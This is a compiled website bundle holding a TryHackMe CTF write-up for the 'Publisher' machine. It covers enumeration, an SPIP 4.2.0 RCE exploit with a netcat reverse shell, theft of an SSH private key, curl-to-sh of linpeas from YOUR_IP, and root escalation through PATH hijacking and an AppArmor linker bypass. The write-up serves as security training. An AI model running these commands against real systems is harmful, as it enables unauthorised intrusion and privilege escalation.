"use strict";(self.webpackChunk_2h3ph3rd_github_io=self.webpackChunk_2h3ph3rd_github_io||[]).push([[8961],{77590:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>h,contentTitle:()=>a,default:()=>d,frontMatter:()=>r,metadata:()=>o,toc:()=>c});var t=s(74848),i=s(28453);const r={},a="Publisher",o={id:"writeups/thm/publisher/index",title:"Publisher",description:"A writeup for the room Publisher on TryHackMe.",source:"@site/docs/writeups/thm/publisher/index.md",sourceDirName:"writeups/thm/publisher",slug:"/writeups/thm/publisher/",permalink:"/docs/writeups/thm/publisher/",draft:!1,unlisted:!1,editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/writeups/thm/publisher/index.md",tags:[],version:"current",frontMatter:{},sidebar:"writeupsSidebar",previous:{title:"Probe",permalink:"/docs/writeups/thm/probe/"},next:{title:"Traverse",permalink:"/docs/writeups/thm/traverse/"}},h={},c=[{value:"What is the user flag?",id:"what-is-the-user-flag",level:2},{value:"Nmap scan",id:"nmap-scan",level:3},{value:"Web server enumeration",id:"web-server-enumeration",level:3},{value:"Searching for the SPIP version",id:"searching-for-the-spip-version",level:3},{value:"Exploiting vulnerabilities in SPIP 4.2.0",id:"exploiting-vulnerabilities-in-spip-420",level:3},{value:"Getting the first flag",id:"getting-the-first-flag",level:3},{value:"What is the root flag?",id:"what-is-the-root-flag",level:2},{value:"Analyzing with LinPEAS",id:"analyzing-with-linpeas",level:3},{value:"Method 1: Exploiting the AppArmor profile",id:"method-1-exploiting-the-apparmor-profile",level:3},{value:"Method 2: Exploiting the SUID binary directly",id:"method-2-exploiting-the-suid-binary-directly",level:3}];function l(e){const n={a:"a",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",h3:"h3",p:"p",pre:"pre",...(0,i.R)(),...e.components},{Image:r}=n;return r||function(e,n){throw new Error("Expected "+(n?"component":"object")+" `"+e+"` to be defined: you likely forgot to import, pass, or provide it.")}("Image",!0),(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.h1,{id:"publisher",children:"Publisher"}),"\n",(0,t.jsxs)(n.p,{children:["A writeup for the room ",(0,t.jsx)(n.a,{href:"https://tryhackme.com/r/room/publisher",children:"Publisher"})," on TryHackMe."]}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:"Test your enumeration skills on this boot-to-root machine."}),"\n"]}),"\n",(0,t.jsx)(r,{src:s(40304).A,height:"256"}),"\n",(0,t.jsx)(n.h2,{id:"what-is-the-user-flag",children:"What is the user flag?"}),"\n",(0,t.jsx)(n.h3,{id:"nmap-scan",children:"Nmap scan"}),"\n",(0,t.jsx)(n.p,{children:"We can start by scanning the target with Nmap:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-sh",children:"nmap -sS TARGET_IP\n"})}),"\n",(0,t.jsx)(n.p,{children:"The scan reveals two open ports: 22 (SSH) and 80 (HTTP)."}),"\n",(0,t.jsx)(r,{src:s(42575).A}),"\n",(0,t.jsx)(n.h3,{id:"web-server-enumeration",children:"Web server enumeration"}),"\n",(0,t.jsxs)(n.p,{children:["We can start by visiting the web server at ",(0,t.jsx)(n.code,{children:"http://TARGET_IP"}),". The page is a simple blog with a few posts."]}),"\n",(0,t.jsx)(n.p,{children:"There isn't much to see here and most of the links are dead."}),"\n",(0,t.jsxs)(n.p,{children:["However, we can notice that in many places there are references to ",(0,t.jsx)(n.code,{children:"SPIP"}),", which is a content management system (CMS)."]}),"\n",(0,t.jsx)(r,{src:s(25567).A}),"\n",(0,t.jsxs)(n.p,{children:["We can use ",(0,t.jsx)(n.code,{children:"gobuster"})," to enumerate the web server for hidden directories."]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-sh",children:"gobuster dir -u http://TARGET_IP -w /usr/share/seclists/Discovery/Web-Content/big.txt\n"})}),"\n",(0,t.jsxs)(n.p,{children:["The scan reveals a few interesting directories, including ",(0,t.jsx)(n.code,{children:"/images"})," and ",(0,t.jsx)(n.code,{children:"/spip"}),"."]}),"\n",(0,t.jsx)(r,{src:s(24074).A}),"\n",(0,t.jsx)(r,{src:s(68236).A}),"\n",(0,t.jsx)(r,{src:s(68953).A}),"\n",(0,t.jsx)(n.h3,{id:"searching-for-the-spip-version",children:"Searching for the SPIP version"}),"\n",(0,t.jsx)(n.p,{children:"Even with the previous enumeration, we didn't find anything interesting."}),"\n",(0,t.jsx)(n.p,{children:"However, now we are sure that the website is running SPIP and there might be a vulnerability in the version used."}),"\n",(0,t.jsxs)(n.p,{children:["There are multiple ways to find the version of SPIP of the website.\nA direct approach is to look at the source code of the page, which reveals the version ",(0,t.jsx)(n.code,{children:"4.2.0"})," inside a meta tag."]}),"\n",(0,t.jsx)(r,{src:s(56733).A}),"\n",(0,t.jsx)(n.h3,{id:"exploiting-vulnerabilities-in-spip-420",children:"Exploiting vulnerabilities in SPIP 4.2.0"}),"\n",(0,t.jsx)(n.p,{children:"We can search for vulnerabilities in SPIP 4.2.0 on the internet."}),"\n",(0,t.jsx)(n.p,{children:"The exploit 51536 seems to be a good candidate for this version allowing remote code execution."}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.a,{href:"https://www.exploit-db.com/exploits/51536",children:"https://www.exploit-db.com/exploits/51536"})}),"\n",(0,t.jsx)(n.p,{children:"We can download the exploit and run it with the target IP. To avoid issues with special characters, we can use a base64 encoded command."}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:'# Testing the exploit\npython3 exploit.py -u http://TARGET_IP/spip -c "sleep 5"\n\n# Running the lister in another terminal\nnc -lvnp 1337\n\n# Running a rev shell by encoding the command in base64\nREV_SHELL=$(echo "" | base64)\necho $REV_SHELL\npython3 exploit.py -u http://TARGET_IP/spip -c "echo $REV_SHELL | base64 -d | bash"\n'})}),"\n",(0,t.jsx)(r,{src:s(54715).A}),"\n",(0,t.jsx)(r,{src:s(40489).A}),"\n",(0,t.jsx)(n.h3,{id:"getting-the-first-flag",children:"Getting the first flag"}),"\n",(0,t.jsxs)(n.p,{children:["Once inside the server, we can navigate to the home directory of the user ",(0,t.jsx)(n.code,{children:"thing"})," where we can find the ssh credentials and the user flag."]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-sh",children:"cat /home/thing/user.txt\ncat /home/thing/.ssh/id_rsa\nssh thing@TARGET_IP\n"})}),"\n",(0,t.jsx)(r,{src:s(31098).A}),"\n",(0,t.jsx)(n.h2,{id:"what-is-the-root-flag",children:"What is the root flag?"}),"\n",(0,t.jsx)(n.h3,{id:"analyzing-with-linpeas",children:"Analyzing with LinPEAS"}),"\n",(0,t.jsx)(n.p,{children:"Now that we are inside the server, we can run LinPEAS to find potential privilege escalation vectors."}),"\n",(0,t.jsx)(n.p,{children:"Be careful, there is no external connection from the server and most of the folder are not writable."}),"\n",(0,t.jsx)(n.p,{children:"A simple solution is to transfer the script to the server using a webserver and then run it directly on the target."}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-sh",children:"# On your machine\npython3 -m http.server 8000\n\n# On the target machine\ncurl http://YOUR_IP:8000/linpeas.sh | sh | less -R\n"})}),"\n",(0,t.jsx)(n.p,{children:"We can notice that there is a binary run_container with SUID set and that also AppArmor is enabled."}),"\n",(0,t.jsx)(n.p,{children:"Looking to our current session, we can see that we are in a container and we are not running bash but ash."}),"\n",(0,t.jsx)(n.p,{children:"This is a shell with limited functionalities based on the AppArmor profile."}),"\n",(0,t.jsx)(r,{src:s(66653).A}),"\n",(0,t.jsx)(n.h3,{id:"method-1-exploiting-the-apparmor-profile",children:"Method 1: Exploiting the AppArmor profile"}),"\n",(0,t.jsx)(n.p,{children:"We can try to look at the AppArmor profile to see if there are any restrictions that we can exploit."}),"\n",(0,t.jsx)(r,{src:s(52313).A}),"\n",(0,t.jsx)(n.p,{children:"Even if we don't have read permission on /opt/, we can still read internal files like /opt/run_container.sh."}),"\n",(0,t.jsx)(n.p,{children:"Also, there is no rule that prevents us from writing to /var/tmp, so we can use this folder to write new files."}),"\n",(0,t.jsx)(n.p,{children:"The script is based on docker, so if we change the PATH we can set up a new docker script to run a reverse shell."}),"\n",(0,t.jsx)(n.p,{children:"The new run_container.sh will then run this custom docker binary which will allow us to get a root shell and then the last flag."}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-sh",children:'cd /var/tmp\ntouch docker\necho "/bin/bash -p" > docker\nchmod +x docker\nPATH=/var/tmp:$PATH run_container\n'})}),"\n",(0,t.jsx)(r,{src:s(42942).A}),"\n",(0,t.jsx)(n.h3,{id:"method-2-exploiting-the-suid-binary-directly",children:"Method 2: Exploiting the SUID binary directly"}),"\n",(0,t.jsx)(n.p,{children:"Since run_container.sh is writable by us, we can modify it to run a reverse shell."}),"\n",(0,t.jsx)(n.p,{children:"However, we need to escape the AppArmor profile by running a bash shell directly."}),"\n",(0,t.jsxs)(n.p,{children:["One possible solution is to run the ",(0,t.jsx)(n.code,{children:"ldd"})," command to find the dynamic linker used by the binary.\nThen, by calling the same linker directly, we can run bash externally and modify the script by adding the command to read the root flag."]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-sh",children:"ldd /opt/run_container\n/lib64/ld-linux-x86-64.so.2 /bin/bash -c 'echo \"cat /root/root.txt\" >> /opt/run_container.sh'\nrun_container\n"})}),"\n",(0,t.jsx)(r,{src:s(89440).A}),"\n",(0,t.jsx)(r,{src:s(17702).A}),"\n",(0,t.jsx)(n.p,{children:"Once done, we simply have to run the binary and get the root flag."}),"\n",(0,t.jsx)(r,{src:s(38955).A})]})}function d(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(l,{...e})}):l(e)}},42575:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/1-1-nmap-4175f390ca17f6f293af3cbe784b6b29.webp"},25567:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/1-2-home-f921a49568392d046540d8defadbd1b6.webp"},24074:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/1-3-gobuster-70cee61227e83ee1e91d0b1751635f8b.webp"},68236:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/1-4-images-68732b108ffeb9e40d46abbf4499ef46.webp"},68953:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/1-5-spip-4bd0a8a094d33f59cb4ad91be27506b7.webp"},56733:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/1-6-source-e77cb04060613791c7f3d5577512f6dd.webp"},54715:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/1-7-exploit-test-cbc4b30fdefb7f6431bfa55ce2ddceaa.webp"},40489:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/1-8-exploit-2036c1eaef48a8ef31b8a91ab379170d.webp"},31098:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/1-9-revshell-f5f2da891b5fdb18b3a8725165d2c704.webp"},66653:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/2-1-suid-849cbc6e5dd9ce3839424285f9bf7d75.webp"},52313:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/2-2-apparmor-profile-58b3313b6b049051808a97c7529c871d.webp"},42942:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/2-3-apparmor-exploit-be61879333c9624e16b9ab575fad9b41.webp"},89440:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/2-4-bash-append-1-e8696e2a8a01f7aaf2b54859cb475743.webp"},17702:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/2-5-bash-append-2-c096a665cb0507b09be7f8f0bc0979a4.webp"},38955:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/2-6-bash-exploit-e6164ea205e3956044e95d256854901e.webp"},40304:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/logo-f8dbe7afeac2cc803424aac18a826337.webp"},28453:(e,n,s)=>{s.d(n,{R:()=>a,x:()=>o});var t=s(96540);const i={},r=t.createContext(i);function a(e){const n=t.useContext(r);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:a(e.components),t.createElement(r.Provider,{value:n},e.children)}}}]);